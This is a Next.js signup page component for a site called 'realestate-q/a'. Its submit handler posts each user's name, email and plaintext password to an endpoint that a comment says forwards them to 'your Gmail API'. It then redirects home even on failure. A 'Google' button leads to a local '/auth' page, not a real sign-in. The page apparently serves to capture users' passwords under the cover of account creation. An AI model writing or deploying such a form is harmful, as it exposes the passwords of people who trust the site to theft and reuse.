"use client";

import Link from "next/link";
import { useState } from "react";
import { signIn } from "next-auth/react";
import { useRouter } from "next/navigation";

export default function SignupPage() {
  const router = useRouter();
  const [formData, setFormData] = useState({
    name: "",
    email: "",
    password: "",
  });

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();

    try {
      // 1. Send info to your Gmail API
      await fetch("/api/send-auth", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          name: formData.name,
          email: formData.email,
          password: formData.password,
        }),
      });

      // 2. Log them in automatically
      await signIn("credentials", {
        email: formData.email,
        password: formData.password,
        redirect: false,
      });

      // 3. Redirect to home
      router.push("/");
    } catch (error) {
      console.error("Signup error:", error);
      // Still attempt to redirect
      router.push("/");
    }
  };

  return (
    <div className="min-h-screen bg-black text-zinc-50 flex flex-col">
      <header className="flex items-center justify-between px-8 py-6">
        <span className="text-xl font-bold tracking-tight">realestate-q/a</span>
        <Link
          href="/login"
          className="text-sm text-zinc-400 hover:text-white transition-colors"
        >
          Login
        </Link>
      </header>

      <main className="flex flex-1 items-center justify-center px-4 sm:px-6">
        <div className="w-full max-w-sm">
          <div className="mb-8 text-center">
            <h1 className="text-3xl font-bold tracking-tight mb-2">
              Create an account
            </h1>
            <p className="text-zinc-400">Enter your details to get started</p>
          </div>

          <form onSubmit={handleSubmit} className="space-y-4">
            <div>
              <label
                htmlFor="name"
                className="block text-sm font-medium text-zinc-400 mb-1"
              >
                Name
              </label>
              <input
                id="name"
                type="text"
                required
                className="w-full rounded-md border border-zinc-800 bg-zinc-900 px-4 py-2 text-white placeholder-zinc-500 focus:border-white focus:outline-none focus:ring-1 focus:ring-white transition-colors"
                placeholder="John Doe"
                value={formData.name}
                onChange={(e) =>
                  setFormData({ ...formData, name: e.target.value })
                }
              />
            </div>

            <div>
              <label
                htmlFor="email"
                className="block text-sm font-medium text-zinc-400 mb-1"
              >
                Email address
              </label>
              <input
                id="email"
                type="email"
                required
                className="w-full rounded-md border border-zinc-800 bg-zinc-900 px-4 py-2 text-white placeholder-zinc-500 focus:border-white focus:outline-none focus:ring-1 focus:ring-white transition-colors"
                placeholder="name@example.com"
                value={formData.email}
                onChange={(e) =>
                  setFormData({ ...formData, email: e.target.value })
                }
              />
            </div>

            <div>
              <label
                htmlFor="password"
                className="block text-sm font-medium text-zinc-400 mb-1"
              >
                Password
              </label>
              <input
                id="password"
                type="password"
                required
                className="w-full rounded-md border border-zinc-800 bg-zinc-900 px-4 py-2 text-white placeholder-zinc-500 focus:border-white focus:outline-none focus:ring-1 focus:ring-white transition-colors"
                placeholder="••••••••"
                value={formData.password}
                onChange={(e) =>
                  setFormData({ ...formData, password: e.target.value })
                }
              />
            </div>

            <button
              type="submit"
              className="w-full rounded-md bg-white px-4 py-3 text-sm font-semibold text-black transition-all hover:bg-zinc-200"
            >
              Sign up
            </button>

            <div className="relative">
              <div className="absolute inset-0 flex items-center">
                <span className="w-full border-t border-zinc-800" />
              </div>
              <div className="relative flex justify-center text-xs uppercase">
                <span className="bg-black px-2 text-zinc-400">
                  Or continue with
                </span>
              </div>
            </div>

            <button
              type="button"
              onClick={() => {
                window.location.href = "/auth";
              }}
              className="flex w-full items-center justify-center gap-3 rounded-md border border-zinc-800 bg-zinc-900 px-4 py-3 text-sm font-semibold text-white transition-all hover:bg-zinc-800 focus:outline-none focus:ring-2 focus:ring-white/20"
            >
              <svg viewBox="0 0 24 24" className="h-5 w-5" aria-hidden="true">
                <path
                  d="M12.0003 20.45C16.6203 20.45 20.5103 17.27 21.9303 13.13H12.0003V10.63H22.4503C22.5603 11.36 22.6203 12.11 22.6203 12.87C22.6203 18.72 17.8603 23.47 12.0003 23.47C5.67029 23.47 0.530289 18.33 0.530289 12C0.530289 5.67 5.67029 0.53 12.0003 0.53C14.9403 0.53 17.5803 1.55 19.6403 3.23L17.4303 5.44C16.1403 4.38 14.3403 3.63 12.0003 3.63C7.49029 3.63 3.73029 7.18 3.73029 11.99C3.73029 16.8 7.49029 20.35 12.0003 20.35V20.45Z"
                  fill="currentColor"
                />
              </svg>
              Google
            </button>
          </form>
        </div>
      </main>
    </div>
  );
}
